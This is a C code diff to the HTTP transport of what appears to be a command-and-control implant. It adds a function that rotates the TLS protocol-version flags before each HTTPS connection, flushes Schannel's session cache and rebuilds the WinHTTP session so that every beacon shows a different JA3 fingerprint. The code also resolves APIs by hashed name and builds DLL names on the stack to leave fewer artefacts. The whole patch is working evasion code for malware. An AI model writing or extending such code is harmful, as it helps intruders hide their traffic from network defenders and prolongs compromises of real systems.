@@ -5,6 +5,86 @@
 
 #ifdef TRANSPORT_HTTP
 
+/* ARC-06: safe fallback for older MinGW SDKs that predate TLS 1.3 WinHTTP flags */
+#ifndef WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3
+#define WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3 0x00002000
+#endif
+
+/*!
+ * @brief
+ *  Rotate the per-connection TLS fingerprint (ARC-06).
+ *
+ *  Picks a random TLS protocol-version bitmask from a set of six safe
+ *  combinations (every entry includes TLS 1.2 so standard servers always
+ *  accept the connection), flushes Schannel's TLS session cache via
+ *  SslEmptyCache to prevent session resumption from masking the new
+ *  parameters, and tears down the cached WinHTTP session so the new flags
+ *  take effect on the next call to HttpSend.
+ *
+ *  The chosen bitmask is stored in Instance->Config.Transport.Ja3ProtoSet
+ *  and applied to the freshly created session handle inside HttpSend.
+ *
+ *  Must only be called when Config.Transport.Ja3Randomize is TRUE.
+ */
+VOID HttpJa3Randomize( VOID )
+{
+    typedef BOOL ( WINAPI *SslEmptyCache_t )( PSTR pszTargetName, DWORD dwFlags );
+
+    /* Six TLS protocol-version combinations that produce distinct Schannel
+     * ClientHellos and therefore distinct JA3 hashes.  Every entry includes
+     * TLS 1.2 so the connection succeeds against any server that supports
+     * at minimum TLS 1.2 (universal as of 2024). */
+    static const DWORD ProtoSets[] = {
+        /* 0: TLS 1.2 only */
+        WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2,
+        /* 1: TLS 1.2 + TLS 1.3 */
+        WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3,
+        /* 2: TLS 1.1 + TLS 1.2 */
+        WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2,
+        /* 3: TLS 1.1 + TLS 1.2 + TLS 1.3 */
+        WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3,
+        /* 4: TLS 1.0 + TLS 1.1 + TLS 1.2 */
+        WINHTTP_FLAG_SECURE_PROTOCOL_TLS1   | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2,
+        /* 5: TLS 1.0 + TLS 1.1 + TLS 1.2 + TLS 1.3 */
+        WINHTTP_FLAG_SECURE_PROTOCOL_TLS1   | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3,
+    };
+    DWORD            ProtoCount   = sizeof( ProtoSets ) / sizeof( ProtoSets[ 0 ] );
+    SslEmptyCache_t  FnEmpty      = NULL;
+    PVOID            SchannelMod  = NULL;
+    /* Stack-allocated DLL name — avoids a heap artefact for a single lookup. */
+    CHAR             SchannelName[ 13 ] = { 'S','c','h','a','n','n','e','l','.','d','l','l','\0' };
+
+    /* Pick a uniformly random protocol-version set. */
+    Instance->Config.Transport.Ja3ProtoSet = ProtoSets[ RandomNumber32() % ProtoCount ];
+
+    /* Flush Schannel's process-wide TLS session cache so the next TCP
+     * connection sends a fresh ClientHello rather than resuming a cached
+     * session, which would reuse the previous cipher parameters. */
+    SchannelMod = LdrModuleLoad( SchannelName );
+    if ( SchannelMod ) {
+        FnEmpty = (SslEmptyCache_t) LdrFunctionAddr( SchannelMod, H_FUNC_SSLEMPTYCACHE );
+        if ( FnEmpty ) {
+            FnEmpty( NULL, 0 );
+        }
+    }
+
+    /* Tear down the cached WinHTTP session so it is recreated with the new
+     * protocol flags on the next HttpSend call. */
+    if ( Instance->hHttpSession ) {
+        Instance->Win32.WinHttpCloseHandle( Instance->hHttpSession );
+        Instance->hHttpSession = NULL;
+    }
+
+    /* Release any cached proxy-discovery result — it will be re-detected
+     * when the new session is opened (one round-trip overhead at most). */
+    if ( Instance->ProxyForUrl ) {
+        Instance->Win32.LocalFree( Instance->ProxyForUrl );
+        Instance->ProxyForUrl       = NULL;
+        Instance->SizeOfProxyForUrl = 0;
+    }
+    Instance->LookedForProxy = FALSE;
+}
+
 /*!
  * @brief
  *  send a http request
@@ -44,6 +124,12 @@ BOOL HttpSend(
     /* we might impersonate a token that lets WinHttpOpen return an Error 5 (ERROR_ACCESS_DENIED) */
     TokenImpersonate( FALSE );
 
+    /* ARC-06: rotate TLS fingerprint before each HTTPS connection so every
+     * session produces a different JA3 hash. */
+    if ( Instance->Config.Transport.Ja3Randomize && Instance->Config.Transport.Secure ) {
+        HttpJa3Randomize();
+    }
+
     /* if we don't have any more hosts left, then exit */
     if ( ! Instance->Config.Transport.Host ) {
         PUTS_DONT_SEND( "No hosts left to use... exit now." )
@@ -66,6 +152,19 @@ BOOL HttpSend(
         if ( ! Instance->hHttpSession ) {
             PRINTF_DONT_SEND( "WinHttpOpen: Failed => %d\n", NtGetLastError() )
             goto LEAVE;
+        }
+
+        /* ARC-06: apply the randomly chosen TLS protocol-version set to the
+         * fresh session so Schannel advertises a different cipher-suite list
+         * in the ClientHello, producing a distinct JA3 hash. */
+        if ( Instance->Config.Transport.Ja3Randomize && Instance->Config.Transport.Secure ) {
+            DWORD ProtoSet = Instance->Config.Transport.Ja3ProtoSet;
+            Instance->Win32.WinHttpSetOption(
+                Instance->hHttpSession,
+                WINHTTP_OPTION_SECURE_PROTOCOLS,
+                &ProtoSet,
+                sizeof( DWORD )
+            );
         }
     }
 
